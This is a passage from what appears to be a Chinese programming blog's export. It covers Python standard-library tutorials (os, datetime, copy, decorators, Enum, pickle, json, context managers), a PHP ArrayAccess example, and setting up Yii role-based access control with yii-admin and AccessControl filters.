os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：12&gt;&gt;&gt; os.path.splitext('/path/to/file.txt')('/path/to/file', '.txt') 这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。 文件操作使用下面的函数。假定当前目录下有一个test.txt文件：1234# 对文件重命名:&gt;&gt;&gt; os.rename('test.txt', 'test.py')# 删掉文件:&gt;&gt;&gt; os.remove('test.py') 但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。 幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是os模块的补充。 最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：123456&gt;&gt;&gt; [x for x in os.listdir('.') if os.path.isdir(x)]['.lein', '.local', '.m2', '.npm', '.ssh', '.Trash', '.vim', 'Applications', 'Desktop', ...]要列出所有的.py文件，也只需一行代码：&gt;&gt;&gt; [x for x in os.listdir('.') if os.path.isfile(x) and os.path.splitext(x)[1]=='.py']['apis.py', 'config.py', 'models.py', 'pymonitor.py', 'test_db.py', 'urls.py', 'wsgiapp.py'] datetime 时间模块now() 获取当前日期和时间我们先看如何获取当前日期和时间：1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; now = datetime.now() # 获取当前datetime&gt;&gt;&gt; print(now)2015-05-18 16:28:07.198690 设置时间1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; dt = datetime(2015, 4, 19, 12, 20) # 用指定日期时间创建datetime&gt;&gt;&gt; print(dt)2015-04-19 12:20:00 转时间戳把一个datetime类型转换为timestamp只需要简单调用timestamp()方法：1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; dt = datetime(2015, 4, 19, 12, 20) # 用指定日期时间创建datetime&gt;&gt;&gt; dt.timestamp() # 把datetime转换为timestamp1429417200.0 注意Python的timestamp是一个浮点数。如果有小数位，小数位表示毫秒数。 时间戳转时间要把timestamp转换为datetime，使用datetime提供的fromtimestamp()方法：1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; t = 1429417200.0&gt;&gt;&gt; print(datetime.fromtimestamp(t))2015-04-19 12:20:00 注意到timestamp是一个浮点数，它没有时区的概念，而datetime是有时区的。上述转换是在timestamp和本地时间(系统时间)做转换。timestamp也可以直接被转换到UTC标准时区的时间：123456&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; t = 1429417200.0&gt;&gt;&gt; print(datetime.fromtimestamp(t)) # 本地时间2015-04-19 12:20:00&gt;&gt;&gt; print(datetime.utcfromtimestamp(t)) # UTC时间2015-04-19 04:20:00 字符串转时间转换方法是通过datetime.strptime()实现，需要一个日期和时间的格式化字符串：1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; cday = datetime.strptime('2015-6-1 18:19:59', '%Y-%m-%d %H:%M:%S')&gt;&gt;&gt; print(cday)2015-06-01 18:19:59 字符串&#39;%Y-%m-%d %H:%M:%S&#39;规定了日期和时间部分的格式 时间转字符串转换方法是通过strftime()实现的，同样需要一个日期和时间的格式化字符串：1234&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; now = datetime.now()&gt;&gt;&gt; print(now.strftime('%a, %b %d %H:%M'))Mon, May 05 16:28 时间的加减加减可以直接用+和-运算符，不过需要导入timedelta这个类：12345678910&gt;&gt;&gt; from datetime import datetime, timedelta&gt;&gt;&gt; now = datetime.now()&gt;&gt;&gt; nowdatetime.datetime(2015, 5, 18, 16, 57, 3, 540997)&gt;&gt;&gt; now + timedelta(hours=10)datetime.datetime(2015, 5, 19, 2, 57, 3, 540997)&gt;&gt;&gt; now - timedelta(days=1)datetime.datetime(2015, 5, 17, 16, 57, 3, 540997)&gt;&gt;&gt; now + timedelta(days=2, hours=12)datetime.datetime(2015, 5, 21, 4, 57, 3, 540997) 时区廖雪峰-datetime 日志模块 logging参考 更多模块用到再添加吧可以查看 廖雪峰教程 补充深浅拷贝浅拷贝是对于一个对象的顶层拷贝正常的赋值就是浅拷贝，只是拷贝了引用地址，一个改变，所有的引用都要变1234567891011&gt;&gt;&gt; a = [11, 12]&gt;&gt;&gt; b = a&gt;&gt;&gt; id(a) # 用来获取a指向的数据的内存地址 31969928&gt;&gt;&gt; id(b) # 用来获取b指向的数据的内存地址31969928&gt;&gt;&gt; a.append(15)&gt;&gt;&gt; a[11, 12, 15]&gt;&gt;&gt; b[11, 12, 15] 使用copy进行copy 属于浅拷贝使用切片拷贝就相当于 copy.copy()12345678910&gt;&gt;&gt; a = [11, 12]&gt;&gt;&gt; import copy&gt;&gt;&gt; b = copy.copy(a)&gt;&gt;&gt; c = a[:]&gt;&gt;&gt; id(a)31970760&gt;&gt;&gt; id(b)43237064&gt;&gt;&gt; id(c)43237070 这个例子看着算是深拷贝，但是 copy 并不是真正的深拷贝下面这个例子可以看出，copy只是复制了顶层的对象进行了拷贝12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&gt;&gt;&gt; a = [11, 12]&gt;&gt;&gt; b = [33, 44]&gt;&gt;&gt; c = [a, b]&gt;&gt;&gt; id(a)31969928&gt;&gt;&gt; id(b)31970760&gt;&gt;&gt; id(c)43237064&gt;&gt;&gt; import copy&gt;&gt;&gt; d = copy.copy(c)&gt;&gt;&gt; id(d)43237128&gt;&gt;&gt; id(d[0])31969928&gt;&gt;&gt; id(d[1])31970760&gt;&gt;&gt; a.append(16)&gt;&gt;&gt; c.append(15)&gt;&gt;&gt; c[[11, 12, 16], [33, 44], 15]&gt;&gt;&gt; d[[11, 12, 16], [33, 44]]``` #### 深拷贝 deepcopy() 深拷贝是对于一个对象所有层次的拷贝(递归) ```python&gt;&gt;&gt; a = [11, 12]&gt;&gt;&gt; b = [33, 44]&gt;&gt;&gt; c = [a, b]&gt;&gt;&gt; id(a)31969928&gt;&gt;&gt; id(b)31970760&gt;&gt;&gt; id(c)43237064&gt;&gt;&gt; import copy&gt;&gt;&gt; d = copy.deepcopy(c)&gt;&gt;&gt; id(d)43237128&gt;&gt;&gt; id(d[0])31969950&gt;&gt;&gt; id(d[1])31970780&gt;&gt;&gt; a.append(16)&gt;&gt;&gt; c.append(15)&gt;&gt;&gt; c[[11, 12, 16], [33, 44], 15]&gt;&gt;&gt; d[[11, 12], [33, 44]]``` ### 装饰器 decorator 为了扩展函数/方法，而不去修改原来的函数 本质上，decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，可以定义如下： ```pythondef log(func): def wrapper(*args, **kw): print('call %s():' % func.__name__) return func(*args, **kw) return wrapper 借助Python的 @ 语法，把decorator置于函数的定义处：123@logdef now(): print('2015-3-25') 调用now()函数，不仅会运行now()函数本身，还会在运行now()函数前打印一行日志：123&gt;&gt;&gt; now()call now():2015-3-25 把 @log 放到now()函数的定义处，相当于执行了语句：1now = log(now) 如果decorator本身需要传入参数，那就需要编写一个返回decorator的高阶函数，写出来会更复杂。比如，要自定义log的文本：1234567def log(text): def decorator(func): def wrapper(*args, **kw): print('%s %s():' % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator 这个3层嵌套的decorator用法如下：12345678@log('execute')def now(): print('2015-3-25')执行结果如下：&gt;&gt;&gt; now()execute now():2015-3-25 和两层嵌套的decorator相比，3层嵌套的效果是这样的：1&gt;&gt;&gt; now = log('execute')(now) 以上两种decorator的定义都没有问题，但还差最后一步。因为我们讲了函数也是对象，它有 __name__ 等属性，但你去看经过decorator装饰之后的函数，它们的 __name__ 已经从原来的’now’变成了’wrapper’：12&gt;&gt;&gt; now.__name__'wrapper' 因为返回的那个wrapper()函数名字就是’wrapper’，所以，需要把原始函数的 __name__ 等属性复制到wrapper()函数中，否则，有些依赖函数签名的代码执行就会出错。 不需要编写 wrapper.__name__ = func.__name__ 这样的代码，Python内置的functools.wraps就是干这个事的，所以，一个完整的decorator的写法如下：12345678910111213141516171819import functoolsdef log(func): @functools.wraps(func) def wrapper(*args, **kw): print('call %s():' % func.__name__) return func(*args, **kw) return wrapper``` ### 权举类 Enum 当我们需要定义常量时，一个办法是用大写变量通过整数来定义，例如月份：```pythonJAN = 1FEB = 2MAR = 3...NOV = 11DEC = 12 好处是简单，缺点是类型是int，并且仍然是变量。 更好的方法是为这样的枚举类型定义一个class类型，然后，每个常量都是class的一个唯一实例。Python提供了Enum类来实现这个功能：123from enum import EnumMonth = Enum('Month', ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec')) 这样我们就获得了Month类型的枚举类，可以直接使用Month.Jan来引用一个常量，或者枚举它的所有成员：12for name, member in Month.__members__.items(): print(name, '=&gt;', member, ',', member.value) value属性则是自动赋给成员的int常量，默认从1开始计数。 如果需要更精确地控制枚举类型，可以从Enum派生出自定义类：1234567891011from enum import Enum, unique@uniqueclass Weekday(Enum): Sun = 0 # Sun的value被设定为0 Mon = 1 Tue = 2 Wed = 3 Thu = 4 Fri = 5 Sat = 6 @unique装饰器可以帮助我们检查保证没有重复值。 访问这些枚举类型可以有若干种方法：12345678910111213141516171819202122232425262728293031&gt;&gt;&gt; day1 = Weekday.Mon&gt;&gt;&gt; print(day1)Weekday.Mon&gt;&gt;&gt; print(Weekday.Tue)Weekday.Tue&gt;&gt;&gt; print(Weekday['Tue'])Weekday.Tue&gt;&gt;&gt; print(Weekday.Tue.value)2&gt;&gt;&gt; print(day1 == Weekday.Mon)True&gt;&gt;&gt; print(day1 == Weekday.Tue)False&gt;&gt;&gt; print(Weekday(1))Weekday.Mon&gt;&gt;&gt; print(day1 == Weekday(1))True&gt;&gt;&gt; Weekday(7)Traceback (most recent call last): ...ValueError: 7 is not a valid Weekday&gt;&gt;&gt; for name, member in Weekday.__members__.items():... print(name, '=&gt;', member)...Sun =&gt; Weekday.SunMon =&gt; Weekday.MonTue =&gt; Weekday.TueWed =&gt; Weekday.WedThu =&gt; Weekday.ThuFri =&gt; Weekday.FriSat =&gt; Weekday.Sat 动态创建类和元类 type廖雪峰-使用元类 调试断言 assert凡是用print()来辅助查看的地方，都可以用断言（assert）来替代：1234567def foo(s): n = int(s) assert n != 0, 'n is zero!' return 10 / ndef main(): foo('0') assert的意思是，表达式 n != 0 应该是 True ，否则，根据程序运行的逻辑，后面的代码肯定会出错。 程序中如果到处充斥着assert，和print()相比也好不到哪去。不过，启动Python解释器时可以用 -O 参数来关闭assert：1234$ python -O err.pyTraceback (most recent call last): ...ZeroDivisionError: division by zero 关闭后，你可以把所有的assert语句当成pass来看。 logging和assert比，logging不会抛出错误，而且可以输出到文件： 123456import logginglogging.basicConfig(level=logging.INFO)s = '0'n = int(s)logging.info('n = %d' % n)print(10 / n) 看到输出了：123456$ python err.pyINFO:root:n = 0 # 看这里Traceback (most recent call last): File "err.py", line 8, in &lt;module&gt; print(10 / n)ZeroDivisionError: division by zero 这就是logging的好处，它允许你指定记录信息的级别，有debug，info，warning，error等几个级别，当我们指定level=INFO时，logging.debug就不起作用了。同理，指定level=WARNING后，debug和info就不起作用了。这样一来，你可以放心地输出不同级别的信息，也不用删除，最后统一控制输出哪个级别的信息。 logging的另一个好处是通过简单的配置，一条语句可以同时输出到不同的地方，比如console和文件。 单元测试廖雪峰-单元测试 文档测试廖雪峰-文档测试 StringIO和BytesIO很多时候，数据读写不一定是文件，也可以在内存中读写。 StringIO顾名思义就是在内存中读写str。 要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：12345678910&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO()&gt;&gt;&gt; f.write('hello')5&gt;&gt;&gt; f.write(' ')1&gt;&gt;&gt; f.write('world!')6&gt;&gt;&gt; print(f.getvalue())hello world! getvalue()方法用于获得写入后的str。 要读取StringIO，可以用一个str初始化StringIO，然后，像读文件一样读取：123456789101112&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO('Hello!\nHi!\nGoodbye!')&gt;&gt;&gt; while True:... s = f.readline()... if s == '':... break... print(s.strip())...Hello!Hi!Goodbye!BytesIO StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。 BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：123456&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO()&gt;&gt;&gt; f.write('中文'.encode('utf-8'))6&gt;&gt;&gt; print(f.getvalue())b'\xe4\xb8\xad\xe6\x96\x87' 请注意，写入的不是str，而是经过UTF-8编码的bytes。 和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取：1234&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO(b'\xe4\xb8\xad\xe6\x96\x87')&gt;&gt;&gt; f.read()b'\xe4\xb8\xad\xe6\x96\x87' 序列化我们把变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫picklingPython提供了pickle模块来实现序列化。 首先，我们尝试把一个对象序列化并写入文件：1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; d = dict(name='Bob', age=20, score=88)&gt;&gt;&gt; pickle.dumps(d)b'\x80\x03&#125;q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.' pickle.dumps()方法把任意对象序列化成一个bytes，然后，就可以把这个bytes写入文件。或者用另一个方法pickle.dump()直接把对象序列化后写入一个file-like Object：123&gt;&gt;&gt; f = open('dump.txt', 'wb')&gt;&gt;&gt; pickle.dump(d, f)&gt;&gt;&gt; f.close() 看看写入的dump.txt文件，一堆乱七八糟的内容，这些都是Python保存的对象内部信息。 当我们要把对象从磁盘读到内存时，可以先把内容读到一个bytes，然后用pickle.loads()方法反序列化出对象，也可以直接用pickle.load()方法从一个 file-like Object 中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象：12345&gt;&gt;&gt; f = open('dump.txt', 'rb')&gt;&gt;&gt; d = pickle.load(f)&gt;&gt;&gt; f.close()&gt;&gt;&gt; d&#123;'age': 20, 'score': 88, 'name': 'Bob'&#125; jsonPython内置的json模块提供了非常完善的Python对象到JSON格式的转换。我们先看看如何把Python对象变成一个JSON：1234&gt;&gt;&gt; import json&gt;&gt;&gt; d = dict(name='Bob', age=20, score=88)&gt;&gt;&gt; json.dumps(d)'&#123;"age": 20, "score": 88, "name": "Bob"&#125;' dumps()方法返回一个str，内容就是标准的JSON。类似的，dump()方法可以直接把JSON写入一个file-like Object。 要把JSON反序列化为Python对象，用loads()或者对应的load()方法，前者把JSON的字符串反序列化，后者从 file-like Object 中读取字符串并反序列化：123&gt;&gt;&gt; json_str = '&#123;"age": 20, "score": 88, "name": "Bob"&#125;'&gt;&gt;&gt; json.loads(json_str)&#123;'age': 20, 'score': 88, 'name': 'Bob'&#125; 把对象json化只需要将class的实例变为dict：12# s 是Student的实例对象print(json.dumps(s, default=lambda obj: obj.__dict__)) 因为通常class的实例都有一个__dict__属性，它就是一个dict，用来存储实例变量。 如果我们要把JSON反序列化为一个Student对象实例，loads()方法首先转换出一个dict对象，然后，我们传入的object_hook函数负责把dict转换为Student实例：12def dict2student(d): return Student(d['name'], d['age'], d['score']) 运行结果如下：123&gt;&gt;&gt; json_str = '&#123;"age": 20, "score": 88, "name": "Bob"&#125;'&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))&lt;__main__.Student object at 0x10cd3c190&gt; 打印出的是反序列化的Student实例对象。 with与上下文管理器with 优雅关闭资源系统资源如文件、数据库连接、socket 而言，应用程序打开这些资源并执行完业务逻辑之后，必须做的一件事就是要关闭（断开）该资源。 为了保证资源的关闭，代码通常是这样写的12345678def m2(): f = open("output.txt", "w") try: f.write("python之禅") except IOError: print("oops error") finally: f.close() 使用with方式123def m3(): with open("output.txt", "r") as f: f.write("Python之禅") 一种更加简洁、优雅的方式就是用 with 关键字。open 方法的返回值赋值给变量 f，当离开 with 代码块的时候，系统会自动调用 f.close() 方法， with 的作用和使用 try/finally 语句是一样的。那么它的实现原理是什么？在讲 with 的原理前要涉及到另外一个概念，就是上下文管理器（Context Manager）。 上下文管理器任何实现了 __enter__() 和 __exit__() 方法的对象都可称之为上下文管理器，上下文管理器对象可以使用 with 关键字。显然，文件（file）对象也实现了上下文管理器。 那么文件对象是如何实现这两个方法的呢？我们可以模拟实现一个自己的文件类，让该类实现 __enter__() 和 __exit__() 方法。1234567891011121314class File(): def __init__(self, filename, mode): self.filename = filename self.mode = mode def __enter__(self): print("entering") self.f = open(self.filename, self.mode) return self.f def __exit__(self, *args): print("will exit") self.f.close() __enter__() 方法返回资源对象，这里就是你将要打开的那个文件对象，__exit__() 方法处理一些清除工作。 因为 File 类实现了上下文管理器，现在就可以使用 with 语句了。123with File('out.txt', 'w') as f: print("writing") f.write('hello, python') 这样，你就无需显示地调用 close 方法了，由系统自动去调用，哪怕中间遇到异常 close 方法也会被调用。 实现上下文管理器的另外方式Python 还提供了一个 contextmanager 的装饰器，更进一步简化了上下文管理器的实现方式。通过 yield 将函数分割成两部分，yield 之前的语句在 __enter__ 方法中执行，yield 之后的语句在 __exit__ 方法中执行。紧跟在 yield 后面的值是函数的返回值。1234567891011from contextlib import contextmanager@contextmanagerdef my_open(path, mode): f = open(path, mode) yield f f.close()调用with my_open('out.txt', 'w') as f: f.write("hello , the simplest context manager")]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[像访问数组一样访问对象]]></title>
    <url>%2F2018%2F10%2F11%2Fphp%2F%E5%AF%B9%E8%B1%A1%E6%95%B0%E7%BB%84-ArrayAccess%2F</url>
    <content type="text"><![CDATA[前言通过实现php提供的 ArrayAccess 接口，可以方便的实现像操作数组一样访问对象 ArrayAccess接口php提供的接口，我们看一下要实现的内容 1234567891011&lt;?phpArrayAccess &#123; // isset判断的时候自动调用 abstract public boolean offsetExists ( mixed $offset ) // 获取数组数据的时候自动调用 abstract public mixed offsetGet ( mixed $offset ) // 添加数据的时候自动调用 abstract public void offsetSet ( mixed $offset , mixed $value ) // unset的时候自动调用 abstract public void offsetUnset ( mixed $offset )&#125; 实现接口(例子)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?php/** * Created by PhpStorm. * User: wangHan * Date: 2016/10/21 * Time: 14:07 */class Human implements ArrayAccess&#123; private $elements; public function __construct() &#123; $this-&gt;elements = [ "boy" =&gt; "male", "girl" =&gt; "female" ]; &#125; /** * isset判断的时候调用 * @param &#123;[type]&#125; $offset key键 */ public function offsetExists($offset) &#123; // TODO: Implement offsetExists() method. return isset($this-&gt;elements[$offset]); &#125; /** * 获取值的时候调用 * @param &#123;[type]&#125; $offset key键 */ public function offsetGet($offset) &#123; // TODO: Implement offsetGet() method. return $this-&gt;elements[$offset]; &#125; /** * 存放值的时候调用 * @param &#123;[type]&#125; $offset key键 */ public function offsetSet($offset, $value) &#123; // TODO: Implement offsetSet() method. $this-&gt;elements[$offset] = $value; &#125; /** * unset的时候调用 * @param &#123;[type]&#125; $offset key键 */ public function offsetUnset($offset) &#123; // TODO: Implement offsetUnset() method. unset($this-&gt;elements[$offset]); &#125;&#125;$human = new Human();$human['people'] = "boyAndGirl"; // 自动调用offsetSetif(isset($human['people'])) &#123; // 自动调用offsetExists echo $human['boy'];// 自动调用offsetGet echo '&lt;br /&gt;'; unset($human['boy']);// 自动调用offsetUnset var_dump($human['boy']);&#125;// // 输出结果 male null 参考]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-RBAC]]></title>
    <url>%2F2018%2F10%2F11%2Fyii%2FRBAC%2F</url>
    <content type="text"><![CDATA[说明可以先参看 中文官方文档yii 为我们提供的两种存储方式一种是文件方式一种是数据库方式，这里我们直接使用数据库的方式，yii 文档给的是直接写代码执行的方式，这种虽然更灵活，但是不够直观，而且最常用到的地方就是后台，所以我们使用可视化的模块 yii-admin yii-admin 扩展过的rbac 和 yii 自带的有一点区别的是权限，yii以权限为基础，而 yii-admin 是以路由为基础的，这一点会在验证的时候进行体现, yii的是Yii::$app-&gt;user-&gt;can(role||permission, params) ，而 yii-admin 的是 Yii::$app-&gt;user-&gt;can(route, params) 准备首先安装 yii-admin 扩展，github地址 创建表执行创建相关表的 migrate 之前需要先配置一下权限管理方式，我们这里选择数据库存储方式(这里配置的是脚本的配置文件 console 下的)1234567// 配置权限管理方式'components' =&gt; [ ... 'authManager' =&gt; [ 'class' =&gt; 'yii\rbac\DbManager', // or use 'yii\rbac\PhpManager' ]], 两条命令，首先创建yii自带的rbac相关表1yii migrate --migrationPath=@yii/rbac/migrations 将会创建四张表itemTable： 该表存放授权条目（译者注：即角色和权限）。默认表名为 “auth_item” 。itemChildTable： 该表存放授权条目的层次关系。默认表名为 “auth_item_child”。assignmentTable： 该表存放授权条目对用户的指派情况。默认表名为 “auth_assignment”。ruleTable： 该表存放规则。默认表名为 “auth_rule”。 执行yii-admin带的menu表1yii migrate --migrationPath=@mdm/admin/migrations 将会得到一个menu表 配置相关配置123456789101112131415161718192021222324252627// 配置成中文，配置这个后将会根据国际化功能把英文映射成对应的中文 'language' =&gt; 'zh-CN', // 配置模块'modules' =&gt; [ 'admin' =&gt; [ 'class' =&gt; 'mdm\admin\Module', 'layout' =&gt; 'left-menu', // yii2-admin的导航菜单 ] ...],// 配置权限管理方式'components' =&gt; [ ... 'authManager' =&gt; [ 'class' =&gt; 'yii\rbac\DbManager', // or use 'yii\rbac\PhpManager' ]],// 为app注册行为 这个是检验用户是否有权限进行访问的'as access' =&gt; [ 'class' =&gt; 'mdm\admin\components\AccessControl', # 配置不检查权限的路由 'allowActions' =&gt; [ 'site/*', 'admin/*', //允许所有人访问admin节点及其子节点 ]], 应用先感受一下配置好后进入admin模块的样子 路由 Route路由相当于一个资源,最小单位使用很简单， 1、2 通过 3 添加到 5 ，其中 1 是自己输入路由（以 / 开头），2 为自动检测出来的路由， 5 为添加到数据库的路由资源， 4 为移除 5 的操作添加的路由会添加到 auth_item 表 ，如下 权限 permission一个权限可以包含多个路由，和一个规则rule 添加权限先创建一个权限 对应表的变化 然后增加路由 对应表的变化 角色 role一个角色可以包含多个权限，多个路由和一个规则rule 添加角色先创建一个角色 对应表的变化 然后增加权限或者路由 对应表的变化 分配角色权限一个用户可以包含多个角色和权限，不能增加路由和规则rule了首先我们会看到用户列表 进行权限分配 对应表的变化 测试结果 规则 rule规则是对权限的补充，算是细分的权限，一般权限是对应这路由的，而规则可以更细一点，比方说一个角色没有更新文章的权限，但是他需要更新自己文章的权限，这时就需要给他赋值更新文章的权限，但是这样他权限就太大了，因为还可以更新别人的文章，这时就需要给他增加一个rule，来验证这篇文章是否属于自己，如果不属于自己则依旧没权限 我们以官网使用rule为例子 这里 来用 yii-admin 的方式实现 首先创建 rule 类, 如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace backend\rbac;use yii\rbac\Rule;/** * 创建规则，相对于路由(权限)的权限更加细分 * 如果该用户满足某个路由(权限)，但是不满足规则依旧不可以访问 */class AuthorRule extends Rule&#123; // 规则名 public $name = 'isAuthor'; /** * @param string|integer $user 用户 ID. * @param Item $item 该规则相关的角色或者权限 * @param array $params get参数 * @return boolean 代表该规则相关的角色或者权限是否被允许 */ public function execute($user, $item, $params) &#123; /** * 请求 和参数值 route:http://admin.yiilearn.com/test/index3?id=10&#123; "user": 2, "item": &#123; "type": "2", "name": "updateOwnPost", "description": "更新自己的", "ruleName": "isAuthor", "data": &#123; "abc": "cba" &#125;, "createdAt": "1539229574", "updatedAt": "1539229574" &#125;, "params": &#123; "id": "10" &#125;&#125; */ // echo json_encode(['user' =&gt; $user, 'item' =&gt; $item, 'params' =&gt; $params]);exit; // 直接返回false表示拒绝，具体的实现可以通过参数进行逻辑判断 return false; &#125;&#125; 我们现在已经有 ibunao 用户了，角色(role1)、权限、路由如下 现在我们添加用户 jidan 用户，为了让其访问 /test/index3 添加rule 对应表的变化 增加权限绑定rule 对应表的变化 然后就是创建角色 role2, 并绑定用户 jidan Rule类进行检验我们可以直接在 execute() 方法中返回 true 或 false , 请求 http://admin.yiilearn.com/test/index3?id=10 会发现分别是可以访问和拒绝访问，表示我们设置的rule已经生效了我们可以根据传过来的参数来进行自己的逻辑判断，来进行拒绝和通过12345678910111213141516171819请求:http://admin.yiilearn.com/test/index3?id=10 execute 方法接收到的参数&#123; "user": 2, # 用户id "item": &#123; # 权限信息 "type": "2", "name": "updateOwnPost", "description": "更新自己的", "ruleName": "isAuthor", "data": &#123; "abc": "cba" &#125;, "createdAt": "1539229574", "updatedAt": "1539229574" &#125;, "params": &#123; # 请求参数 "id": "10" &#125;&#125; 使用yii的验证1234567891011121314151617181920212223242526272829303132333435363738394041424344454647481. 配置文件 config/main.php 注释掉 使用 yii-admin 验证的部分或者允许test/index3进行访问 // 'as access' =&gt; [// 'class' =&gt; 'mdm\admin\components\AccessControl',// 'allowActions' =&gt; [// 'site/*',//允许访问的节点，可自行添加// 'admin/*',//允许所有人访问admin节点及其子节点// //'test/index3'// ]// ],2. 在使用的类加过滤器 在 TestController 控制器添加验证，这个忘记的可以参看 AFC验证 部分 public function behaviors()&#123; return [ 'access' =&gt; [ 'class' =&gt; AccessControl::className(), 'rules' =&gt; [ [ 'actions' =&gt; ['index3'], 'allow' =&gt; true, 'roles' =&gt; ['/test/index3'], 'roleParams' =&gt; ['a', 'b', 'c'], ], ], ], ];&#125;这是 execute 方法接收的参数为 &#123; "user": 2, # 用户id "item": &#123; # 权限详情 "type": "2", "name": "updateOwnPost", "description": "更新自己的", "ruleName": "isAuthor", "data": &#123; "abc": "cba" &#125;, "createdAt": "1539229574", "updatedAt": "1539229574" &#125;, "params": [ # roleParams 配置的参数 "a", "b", "c" ]&#125; 用户列表yii-admin 为后台也提供了一系列的用户操作功能（注册、改密码等），但是默认是没有显示的，需要自己根据自己的需要添加按钮 如果你的没有显示上面红框的内容可以参考我的代码123456789101112131415161718192021222324找到action对应的视图 ... ... # 增加的创建用户按钮 &lt;p&gt; &lt;?= Html::a(Yii::t('rbac-admin', 'Create User'), ['signup'], ['class' =&gt; 'btn btn-success']) ?&gt; &lt;/p&gt; ... ... &lt;?= GridView::widget([ ... ... [ 'class' =&gt; 'yii\grid\ActionColumn', // 这个原始的有问题，直接上下面那行 // 'template' =&gt; Helper::filterActionColumn(['view', 'activate', 'delete']), 'template' =&gt; '&#123;view&#125; &#123;activate&#125; &#123;delete&#125;', 'buttons' =&gt; [ ... ...&lt;/div&gt; 目录 menuyii-admin 增加了目录功能，可以设置目录，然后根据用户的权限来显示目录 增加目录，数据的作用会在后面说 增加子目录，注意排序 增加子目录，注意排序 对应表的变化 目录显示 目录显示的代码123456789101112131415161718192021222324252627282930313233views\layout\main.php......&lt;!-- 增加yii-admin设置的目录 --&gt;&lt;?phpuse mdm\admin\components\MenuHelper;// 这个匿名函数可以根据设置menu时的数据，将英文转成中文$callback = function($menu)&#123; $data = $menu['data']; return [ // 显示改成设置的数据 'label' =&gt; $data ? $data : $menu['name'], 'url' =&gt; [$menu['route']], 'items' =&gt; $menu['children'] ];&#125;;// 获取用户权限能看到的菜单，这个是关键$items = MenuHelper::getAssignedMenu(Yii::$app-&gt;user-&gt;id, null, $callback); ?&gt;...... // 合并权限目录 $menuItems = array_merge($items, $menuItems); echo Nav::widget([ 'options' =&gt; ['class' =&gt; 'navbar-nav navbar-right'], 'items' =&gt; $menuItems, ]); NavBar::end(); ?&gt;...... 也可以参考以下不错的文章北哥这篇文讲解yii2权限扩展（yii2-admin） - 上部 北哥这篇文讲解yii2权限扩展（yii2-admin） - 中部北哥这篇文讲解yii2权限扩展（yii2-admin） - 下部Yii2项目后台整合yii2-admin模块Yii2基于角色的权限控制（RBAC）]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>RBAC</tag>
        <tag>yii-admin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-AFC验证]]></title>
    <url>%2F2018%2F10%2F11%2Fyii%2FAFC%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[实例1234567891011121314151617181920212223242526272829use yii\web\Controller;use yii\filters\AccessControl;class SiteController extends Controller&#123; public function behaviors() &#123; return [ 'access' =&gt; [ 'class' =&gt; AccessControl::className(), 'only' =&gt; ['login', 'logout', 'signup'], 'except' =&gt; ['login'], 'rules' =&gt; [ [ 'allow' =&gt; true, 'actions' =&gt; ['login', 'signup'], 'roles' =&gt; ['?'], ], [ 'allow' =&gt; true, 'actions' =&gt; ['logout'], 'roles' =&gt; ['@'], ], ], ], ]; &#125; // ...&#125; 验证流程AccessControl过滤器 注意，如果AccessControll配置的需要验证的action，在配置的rules中如果验证没有通过或者没有rule来验证当前请求的action(也就是不符合所有rule需要验证的action)都会拒绝访问 only 和 except 配置only 表示需要验证的 actionId ,如果为空，这个控制器的所有action都将会向下进行验证逻辑 except 表示过滤掉的 actionId 这些action将不会走校验， except 的优先级更高，如果同时属于 only 和 except 那么这个action将不会走验证 denyCallback 配置这个是配置一个匿名函数，一般也不用配置，在 rule 被拒绝的时候如果 rule 没有配置 denyCallback 将会执行这个，通常用来抛出异常的，可以参考 yii的兜底方法 denyAccess AccessRule 验证规则配置1234567891011121314# 必填，如果为false表示不管通过不通过验证，都为false拒绝 'allow' =&gt; true,# 选填，判断当前action是否属于验证的范围，如果为空，表示所有action都要验证 'actions' =&gt; ['login', 'signup'],# 